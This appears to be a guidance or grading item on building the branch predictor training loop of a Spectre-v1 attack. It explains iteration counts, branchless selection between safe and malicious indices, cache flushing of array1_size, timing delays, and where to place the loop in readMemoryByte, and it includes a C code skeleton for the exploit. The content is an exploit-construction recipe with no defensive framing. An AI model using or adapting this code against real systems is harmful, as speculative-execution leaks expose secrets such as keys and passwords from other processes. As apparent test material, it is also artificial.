Title: Proper Branch Predictor Training Loop Sequence

Importance: 
The branch predictor training loop sequence is a critical component in Spectre-v1 attacks that directly affects the success rate of speculative execution exploitation. Without proper training, the branch predictor will not be sufficiently conditioned to mispredict branches when needed, leading to failed attacks. This sequence ensures that the processor's branch prediction mechanism is "trained" to expect valid bounds checks, making it more likely to speculatively execute the vulnerable code path when an out-of-bounds index is later provided.

Implementation Guidance:
1. Establish a training loop that executes the victim function with valid, in-bounds indices multiple times (typically 30-50 iterations)
2. The training loop must use a branchless approach for selecting between safe and malicious indices. Use an arithmetic formula such as: 
   `index = safe_index + cond × (malicious_index − safe_index)` 
   where `cond` is computed mathematically without explicit conditionals (e.g., `cond = (loop_counter % N == 0)` computed as an integer).
3. In general, the branch predictor training loop should include exclusively the following components maintaining the exact sequence:
   a. Calculate interleaved index using branchless approach
   b. Evict control variable from cache (e.g., array1_size to ensure the bounds check is not cached)
   c. Add controlled delay (e.g., 100 cycles) to stabilize memory state and provide window for speculative execution
   d. Invoke victim function with the calculated index
4. The training pattern should follow these specifics:
   - Recommended number of training iterations: 30-50
   - Suggested frequency of malicious access: every 3rd or 4th iteration
   - Importance of having either the final iteration or periodic iterations use the malicious index

Placement Guidance:
The branch predictor training loop should be placed at the beginning of the readMemoryByte function, before attempting to access out-of-bounds memory. It should be implemented as a nested loop within the main retry loop (tries), ensuring that the branch predictor is re-trained for each attack attempt. The training loop should execute immediately before the cache eviction operations and the actual speculative execution trigger. This placement is crucial because:
1. It ensures the branch predictor is properly conditioned for each attack attempt
2. It occurs after cache initialization but before the actual attack
3. It provides the necessary context for the processor to mispredict the bounds check during the subsequent out-of-bounds access

Example code structure:
```
for (tries = 999; tries > 0; tries--) {
    // Initialize results array
    for (i = 0; i < 256; i++) results[i] = 0;
    
    // Flush side-channel array
    for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
    
    // Branch predictor training loop (30-50 iterations)
    for (int training_loop = 0; training_loop < 50; training_loop++) {
        // Branchless selection between safe and malicious indices
        safe_x = training_loop % array1_size;
        int cond = (training_loop % 3 == 0); // Every 3rd iteration
        x = safe_x + cond * (malicious_x - safe_x);
        
        // Evict control variable from cache
        _mm_clflush(&array1_size);
        
        // Controlled delay to stabilize memory state
        for (volatile int z = 0; z < 100; z++) {}
        
        // Invoke victim function
        victim_function(x);
    }
    
    // Cache timing measurement phase
    // ...
}
```